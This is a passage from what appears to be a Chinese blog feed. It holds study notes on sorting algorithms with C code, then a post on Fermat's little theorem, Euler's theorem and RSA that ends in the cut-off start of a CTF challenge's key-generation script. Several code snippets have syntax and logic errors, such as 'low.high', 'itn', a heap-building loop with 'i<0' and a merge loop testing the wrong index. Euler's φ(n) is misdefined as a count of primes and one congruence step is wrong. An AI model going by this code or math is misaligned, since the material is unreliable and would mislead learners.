class="keyword">if</span>(A[i]&lt;A[i<span class="number">-1</span>])&#123;</span><br><span class="line">temp=A[i];</span><br><span class="line"><span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;<span class="number">0</span>&amp;&amp;A[j]&gt;temp;--j)&#123;</span><br><span class="line">A[j+<span class="number">1</span>]=A[j];</span><br><span class="line">&#125;</span><br><span class="line">A[j+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>哨兵:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span>  i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i]&lt;A[i<span class="number">-1</span>])&#123;</span><br><span class="line">A[<span class="number">0</span>]=A[i];</span><br><span class="line"><span class="keyword">for</span>(j=i<span class="number">-1</span>;A[<span class="number">0</span>]&lt;A[j];--j)&#123;</span><br><span class="line">A[j+<span class="number">1</span>]=A[j];</span><br><span class="line">&#125;</span><br><span class="line">A[j+<span class="number">1</span>]=A[<span class="number">0</span>]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>优化-折半插入排序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span> i,j,low.high,mid;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">A[<span class="number">0</span>]=A[i];</span><br><span class="line">low=<span class="number">1</span>;high=i<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(A[mid]&gt;A[<span class="number">0</span>]) high=mid<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span> low=mid+<span class="number">1</span>; <span class="comment">//查找右半子表 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=high+<span class="number">1</span>;--j)&#123;</span><br><span class="line">A[j+<span class="number">1</span>]=A[j];</span><br><span class="line">&#125;</span><br><span class="line">A[high+<span class="number">1</span>]=A[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>当low&gt;high时折半查找停止,应将[low,i-1]内的元素全部右移,并将A[0]复制到low所指位置<br>当A[mid]==A[0]时,为了保证算法的稳定性,应继续在mid所指位置右边寻找插入位置<br>-&gt;对链表进行插入排序<br>avg 0(n^2)</p><h2 id="8-3-希尔排序"><a href="#8-3-希尔排序" class="headerlink" title="8.3 希尔排序"></a>8.3 希尔排序</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/5252914151146.png" alt=""><br>每次将增量缩小一半<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ShellSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span> d,i,j;</span><br><span class="line"><span class="keyword">for</span>(d=n/<span class="number">2</span>;d&gt;=<span class="number">1</span>;d=d/<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(i=d+<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i]&lt;A[i-d])&#123;</span><br><span class="line">A[<span class="number">0</span>]=A[i];</span><br><span class="line"><span class="keyword">for</span>(j=i-d;j&gt;<span class="number">0</span>&amp;&amp;A[<span class="number">0</span>]&lt;A[j];j-=d)&#123;</span><br><span class="line">A[j+d]=A[j];</span><br><span class="line">&#125;</span><br><span class="line">A[j+d]=A[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>仅适用于顺序表</p><h2 id="8-4-冒泡排序"><a href="#8-4-冒泡排序" class="headerlink" title="8.4 冒泡排序"></a>8.4 冒泡排序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> &amp;a;<span class="type">int</span> &amp;b)</span>&#123;</span><br><span class="line"><span class="type">int</span> temp=a;</span><br><span class="line">a=b;</span><br><span class="line">b=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=n<span class="number">-1</span>;j&gt;i;j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[j<span class="number">-1</span>]&gt;A[j])&#123;</span><br><span class="line">swap(A[j<span class="number">-1</span>],A[j]);</span><br><span class="line">flag=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-5-快速排序-代码重点"><a href="#8-5-快速排序-代码重点" class="headerlink" title="8.5 快速排序(代码重点)"></a>8.5 快速排序(代码重点)</h2><p>用第一个元素把待排序序列划分为两个部分.左边更小,右边更大,该元素的最终位置已确定<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//快速排序 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">QuickSort</span><span class="params">(<span class="type">int</span> A[],itn low,<span class="type">int</span> high)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(low&lt;high)&#123;  <span class="comment">//递归跳出的条件 </span></span><br><span class="line"><span class="type">int</span> pivotpos=Partition(A,low,high); <span class="comment">//划分 </span></span><br><span class="line">QuickSort(A,low,pivotpos<span class="number">-1</span>);  <span class="comment">//划分左子表 </span></span><br><span class="line">QuickSort(A,pivotpos+<span class="number">1</span>,high);  <span class="comment">//划分右子表 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用第一个元素将待排序序列划分成左右两个部分</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Partition</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> low,<span class="type">int</span> high)</span>&#123;</span><br><span class="line"><span class="type">int</span> pivot=A[low];  <span class="comment">//第一个元素作为枢轴 </span></span><br><span class="line"><span class="keyword">while</span>(low&lt;high)&#123;  <span class="comment">//用low,high搜索枢轴的最终位置 </span></span><br><span class="line"><span class="keyword">while</span>(low&lt;high&amp;&amp;A[high]&gt;=pivot) --high;</span><br><span class="line">A[low]=A[high]; <span class="comment">//比枢轴小的元素移动到左端 </span></span><br><span class="line"><span class="keyword">while</span>(low&lt;high&amp;&amp;A[low]&lt;=pivot) ++low;</span><br><span class="line">A[high]=A[low];  <span class="comment">//比枢轴大的元素移动到右端 </span></span><br><span class="line">&#125;</span><br><span class="line">A[low]=pivot;  <span class="comment">//枢轴元素存放到最终位置 </span></span><br><span class="line"><span class="keyword">return</span> low; <span class="comment">//返回存放枢轴位置的最终位置 </span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>时间复杂度=O(n*递归层数)<br>空间复杂度=O(递归层数)<br>把n个元素组织成二叉树,二叉树的层数就是递归调用的层数<br>最小高度=[log2 n]+1<br>最大高度=n</p><p>若每⼀次选中的“枢轴”将待排序序列<br>划分为很不均匀的两个部分，则会导<br>致递归深度增加，算法效率变低</p><p>若初始序列有序或逆序，则快速排序<br>的性能最差（因为每次选择的都是最<br>靠边的元素）</p><p>若每⼀次选中的“枢轴”将待排序序列<br>划分为均匀的两个部分，则递归深度<br>最⼩，算法效率最⾼</p><p>快速排序算法优化思路：尽量选择可以把<br>数据中分的枢轴元素。<br>eg：①选头、中、尾三个位置的元素，取<br>中间值作为枢轴元素；②随机选⼀个元素<br>作为枢轴元素</p><p>算法稳定性:不稳定</p><h2 id="8-6-选择排序"><a href="#8-6-选择排序" class="headerlink" title="8.6 选择排序"></a>8.6 选择排序</h2><p>每一趟在待排序元素中选取关键字最小的元素加入有序子序列<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SelectSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> min=i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[j]&lt;A[min]) min=j;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(min!=i) swap(A[i],A[min]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>不稳定<br>既可以用于顺序表,也可以用于链表</p><h2 id="8-7-堆排序"><a href="#8-7-堆排序" class="headerlink" title="8.7 堆排序"></a>8.7 堆排序</h2><p>大根堆:L(i)&gt;=L(2i)且L(i)&gt;=L(2i+1)  在完全二叉树中根&gt;=左,右<br>小根堆:L(i)&lt;=L(2i)且L(i)&lt;=L(2i+1) 在完全二叉树中根&lt;=左,右</p><h3 id="建立大根堆"><a href="#建立大根堆" class="headerlink" title="建立大根堆"></a>建立大根堆</h3><p>把所有非终端结点都检查一遍,是否满足大根堆的要求,如果不满足,则进行调整</p><p>检查当前结点是否满足根&gt;=左,右  若不满足,将当前结点与更大的一个孩子互换</p><p>若元素互换破坏了下一级的堆,则采用相同的方法继续往下调整(小元素不断下坠)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//建立大根堆</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BuildMaxHeap</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=len/<span class="number">2</span>;i&lt;<span class="number">0</span>;i--)&#123; <span class="comment">//从后往前调整所有非终端结点 </span></span><br><span class="line">HeadAdjust(A,i,len);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//将以k为根的子树调整为大根堆</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">HeadAdjust</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> k,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">A[<span class="number">0</span>]=A[k]; <span class="comment">//A[0]暂存子树的根结点 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>*k;i&lt;=len;i*=<span class="number">2</span>)&#123; <span class="comment">//沿key较大的子节点向下筛选 </span></span><br><span class="line"><span class="keyword">if</span>(i&lt;len&amp;&amp;A[i]&lt;A[i+<span class="number">1</span>])&#123;</span><br><span class="line">i++;     <span class="comment">//取key较大的子结点的下标 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(A[<span class="number">0</span>]&gt;=A[i]) <span class="keyword">break</span>; <span class="comment">//筛选结束 </span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">A[k]=A[i]; <span class="comment">//将A[i]调整到双亲结点上 </span></span><br><span class="line">k=i;  <span class="comment">//修改k值,以便继续向下筛选 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">A[k]=A[<span class="number">0</span>]; <span class="comment">//被筛选结点的值放入最终位置 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="基于大根堆进行排序"><a href="#基于大根堆进行排序" class="headerlink" title="基于大根堆进行排序"></a>基于大根堆进行排序</h3><p>堆排序:每一趟将堆顶元素加入有序序列<br>并将待排序元素序列再次调整为大根堆<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//建立大根堆 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BuildMaxHeap</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> len)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将以k为根的子树调整为大根堆 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">HeadAdjust</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> k,<span class="type">int</span> len)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//堆排序的完整逻辑</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">HeapSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> len)</span>&#123;</span><br><span class="line">BuildMaxHeap(A,len);  <span class="comment">//初始建堆 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=len;i&gt;<span class="number">1</span>;i--)&#123;  <span class="comment">//n-1趟的交换和建堆过程 </span></span><br><span class="line">swap(A[i],A[<span class="number">1</span>]);  <span class="comment">//堆顶元素和堆低元素交换 </span></span><br><span class="line">HeadAdjust(A,<span class="number">1</span>,i<span class="number">-1</span>);  <span class="comment">//把剩余的待排序元素整理成堆 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br><mark>建堆的过程,关键字对比次数不超过4n,建堆时间复杂度=O(n)</mark><br>堆排序的时间复杂度=O(n)+O(nlog2n)=O(nlog2n)<br>空间复杂度O(1)</p><p>堆排列是不稳定的</p><h2 id="8-8-堆的插入删除"><a href="#8-8-堆的插入删除" class="headerlink" title="8.8 堆的插入删除"></a>8.8 堆的插入删除</h2><p>对于小根堆,新元素放到表尾,与父节点对比.若新元素比父节点更小,则二者互换.新元素就这样一路上升,直到无法继续上升为止<br>被删除的元素用堆底元素替代,然后让该元素不断”下坠”,直到无法下坠为止<br>关键字对比次数:<br>每次”上升”调整只需对比关键字1次<br>每次”下坠”调整可能需要对比关键字2次,也可能只需要对比1次</p><h2 id="8-9-归并排序"><a href="#8-9-归并排序" class="headerlink" title="8.9 归并排序"></a>8.9 归并排序</h2><p>Merge<br>归并:把两个或多个已经有序的序列合并成一个<br>只剩一个子表未合并时,可以将该表中剩余元素全部加到总表<br>4路归并则每选出一个小元素注需比对关键字3次<br>结论:m路归并,每选出一个元素需要对比关键字m-1次<br>在内部排序中一般采用2路归并<br>核心操作:把数组内的两个有序序列归并为一个<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *B=(<span class="type">int</span> *)<span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">//辅助数组B</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> low,<span class="type">int</span> mid,<span class="type">int</span> high)</span>&#123;</span><br><span class="line"><span class="type">int</span> i,j,k;</span><br><span class="line"><span class="keyword">for</span>(k=low;k&lt;=high;k++)&#123;</span><br><span class="line">B[k]=A[k];   <span class="comment">//将A中所有元素复制到B中 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=low,j=mid+<span class="number">1</span>,k=i;i&lt;=mid&amp;&amp;j&lt;=high;k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(B[i]&lt;=B[j])&#123;</span><br><span class="line">A[k]=B[i++];   <span class="comment">//将较小值复制到A中 </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">A[k]=B[j++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=mid) A[k++]=B[i++];</span><br><span class="line"><span class="keyword">while</span>(i&lt;=high) A[k++]=B[j++];</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MergeSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> low,<span class="type">int</span> high)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line"><span class="type">int</span> mid=(low+high)/<span class="number">2</span>;  <span class="comment">//从中间划分 </span></span><br><span class="line">MergeSort(A,low,mid);  <span class="comment">//对左半部分归并 </span></span><br><span class="line">MergeSort(A,mid+<span class="number">1</span>,high); <span class="comment">//对右半部分归并 </span></span><br><span class="line">Merge(A,low,mid,high); <span class="comment">//归并 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结论:n个元素进行2路归并排序,归并趟数=[log2 n]<br>时间复杂度O(nlog2 n)<br>空间复杂度O(n),来自于辅助数组B<br>稳定的性能</p><h2 id="8-10-基数排序"><a href="#8-10-基数排序" class="headerlink" title="8.10 基数排序"></a>8.10 基数排序</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/5240113141147.png" alt=""><br>基数排序不是基于”比较”的排序算法<br>空间复杂度O(r)<br>时间复杂度O(d(n+r))<br>基数排序是稳定的<br>基数排序擅长解决的问题:<br>1.数据元素的关键字可以方便地拆分为d组,且d较小<br>2.每组关键字的取值范围不大,即r较小<br>3.数据元素个数n较大</p><h2 id="8-11-外部排序"><a href="#8-11-外部排序" class="headerlink" title="8.11 外部排序"></a>8.11 外部排序</h2><p>磁盘的读/写以”块”为单位,数据读入内存后才能被修改,修改完了还要写回磁盘<br>外部排序:数据元素太多,无法一次全部读入内存进行排序<br>使用”归并排序”的方法,最少只需在内存中分配3块大小的缓冲区即可对任意一个文件进行排序<br>“归并排序”要求各个子序列有序,每次读入两个块的内容,进行内部排序后写回磁盘<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5669809169573.gif" alt="动画"><br>外部排序时间开销=读写外存的时间+内部排序所需的时间+内部归并所需时间<br>重要结论:采用多路归并可以减少归并趟数,从而减少磁盘I/O(读写)次数<br>对 r 个初始归并段，做k路归并，则归并树可⽤ k 叉树表示<br>若树⾼为h，则归并趟数 = h-1 = ⌈logk r⌉</p><p>多路归并带来的负面影响:<br>1.k路归并时,需要开辟k个输入缓冲区,内存开销增加<br>2.每挑选一个关键字需要对比关键字(k-1)次,内部归并所需时间增加</p><p>结论：若能增加初始归并段的⻓度，则可减少初始归并段数量 r</p><h2 id="8-12-败者树—选出最小元素log2-k次"><a href="#8-12-败者树—选出最小元素log2-k次" class="headerlink" title="8.12 败者树—选出最小元素log2 k次"></a>8.12 败者树—选出最小元素log2 k次</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/2771243157440.png" alt=""></p><h2 id="8-13-置换—选择排序-r↓"><a href="#8-13-置换—选择排序-r↓" class="headerlink" title="8.13 置换—选择排序 r↓"></a>8.13 置换—选择排序 r↓</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/406053177606.png" alt=""></p><h2 id="8-14-最佳归并树"><a href="#8-14-最佳归并树" class="headerlink" title="8.14 最佳归并树"></a>8.14 最佳归并树</h2><p>归并过程中的磁盘I/O次数=归并树的WPL*2<br><a href="#哈夫曼的构造">#哈夫曼的构造</a><br>-&gt;多路归并的最佳归并树<br>注意：对于k叉归并，若初始归并段的数量⽆法构成严格的 k 叉归并树，<br>则需要补充⼏个⻓度为 0 的“虚段”，再进⾏ k 叉哈夫曼树的构造。<br>①若（初始归并段数量 -1）% （k-1）= 0，说明刚好可以构成严格k叉树，此时不需要添加虚段<br>②若（初始归并段数量 -1）% （k-1）= u ≠ 0，则需要补充 (k-1) - u 个虚段</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DS&quot;&gt;&lt;a href=&quot;#DS&quot; class=&quot;headerlink&quot; title=&quot;DS&quot;&gt;&lt;/a&gt;DS&lt;/h1&gt;&lt;h1 id=&quot;2-线性表&quot;&gt;&lt;a href=&quot;#2-线性表&quot; class=&quot;headerlink&quot; title=&quot;2.线性表&quot;&gt;&lt;/a&gt;2.线性</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>RSA与费马小定理</title>
    <link href="https://iloveflag.github.io/2020/09/23/RSA%E4%B8%8E%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/"/>
    <id>https://iloveflag.github.io/2020/09/23/RSA%E4%B8%8E%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/</id>
    <published>2020-09-23T12:47:03.000Z</published>
    <updated>2025-02-14T14:45:19.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="费马小定理与证明"><a href="#费马小定理与证明" class="headerlink" title="费马小定理与证明"></a>费马小定理与证明</h1><h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><p>$(x+1)^{p}$二项式展开减去第一项和最后一项，则<br>$(n+1)^{p}-n^{p}-1$是p的倍数</p><h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><p>费马小定理是数论中的一个定理：假如a是一个整数，p是一个质数，那么$a^{p}-a$是p的倍数，可以表示为</p><script type="math/tex; mode=display">a^{p} \equiv a \quad(\bmod p)</script><script type="math/tex; mode=display">a^{p} /p -a/p=0</script><p>即两个数同余<br>经过变形可成为</p><script type="math/tex; mode=display">a(a^{p-1} -1)\equiv 1 \quad(\bmod p)</script><p>则如果a不是p的倍数，这个定理也可以写成</p><script type="math/tex; mode=display">a^{p-1} \equiv 1 \quad(\bmod p)</script><h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><p>通过杨辉三角形可以看出$(x+1)^{p}$当p为素数时，二项式展开，除了第一项和最后一项，其他系数都是p的倍数，因为二项式展开的系数为${C_{n}^{k-1}}$<br>如图:</p><script type="math/tex; mode=display">(x+1)^{n}=x^{n}+n x^{n-1}+\frac{n(n-1)}{2} x^{n-2}+\frac{n(n-1)(n-2)}{2 \times 3} x^{n-3}+...</script><p>当n为质数时，系数分子就不能被分母约分，保留n，所以存在了倍数关系<br>要证明$a^{p}-a$是p的倍数，那么两个式子相加</p><script type="math/tex; mode=display">((a+1)^{p}-a^{p}-1)+(a^{p}-a)\equiv(a+1)^{p}-(a+1)</script><script type="math/tex; mode=display">((a+1)^{p}-a^{p}-1)必为p的倍数,(a^{p}-a)和(a+1)^{p}-(a+1)相差1项</script><p>则用数学归纳法证明<br>a=1时成立</p><script type="math/tex; mode=display">a^{p}-a=1-1 \equiv 0</script><p>0可以被任意素数整除<br>证明完毕</p><h2 id="卡迈尔数"><a href="#卡迈尔数" class="headerlink" title="卡迈尔数"></a>卡迈尔数</h2><p>但是费马素性检验不是充分必要的</p><p>(卡迈克尔数 Carmichael number）<br>更极端的反例是卡迈克尔数： 假设a与561互质，则$a^560$被561除都余1。这样的数被称为卡迈克尔数，561是最小的卡迈克尔数</p><h1 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h1><p>$\phi(n)$表示小于n的素数个数<br>例如$\phi(8)=4$<br>取出两个互素的a和n<br>$a^{\phi(n)}-1=n$的倍数<br>$a^{\phi(n)}=1 \quad(\bmod n)$<br>当n=素数时，$\phi(n)$=n-1<br>则$a^{n-1}=1 \quad(\bmod n)$<br>即费马小定理</p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p><img src="https://cdn.jsdelivr.net/gh/iloveflag/images/20200923204921.png" alt="20200923204921"></p><h2 id="为什么e和n要互质"><a href="#为什么e和n要互质" class="headerlink" title="为什么e和n要互质?"></a>为什么e和n要互质?</h2><p>$ed=1 \quad(\bmod n)$<br>d是e的模逆元，由同余解的存在性可知<br>$ax=b \quad(\bmod m)$<br>x解的个数为gcd(a,m)</p><h2 id="费马小定理与rsa的奶子关系"><a href="#费马小定理与rsa的奶子关系" class="headerlink" title="费马小定理与rsa的奶子关系"></a>费马小定理与rsa的奶子关系</h2><p><img src="https://cdn.jsdelivr.net/gh/iloveflag/images/20201103105525.png" alt="20201103105525"></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line">FLAG = <span class="string">&quot;************************************&quot;</span></span><br><span class="line">mybytes = FLAG.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(mybytes, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(<span class="number">2048</span>)</span><br><span class="line">q = number.getPrime(<span class="number">2048</span>)</span><br><span class="line">r = <span class="number">663111019425944540514080507309</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi) <span class="comment">#find d that e*d mod phi=1</span></span><br><span class="line">k = (p-r)*d</span><br><span class="line">enc = gmpy2.powmod(flag, e, p * q) <span class="comment"># pow(flag,e) mod (p*q)</span></span><br><span class="line"><span 